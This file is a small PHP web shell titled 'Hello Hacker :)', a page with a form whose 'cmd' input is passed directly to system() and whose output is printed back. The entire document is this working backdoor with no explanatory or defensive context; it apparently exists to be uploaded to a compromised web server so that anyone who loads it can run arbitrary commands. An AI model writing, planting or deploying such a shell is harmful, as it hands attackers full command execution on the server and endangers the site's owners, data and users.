<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Hello Hacker :)</title>
</head>
<body>
	<h1>Execute Command</h1>
	<form method="GET">
		<input type="text" name="cmd">
		<input type="submit" name="submit">
	</form>
	<h4><?php echo "Output : ";system($_REQUEST['cmd']);?></h4>

</body>
</html>

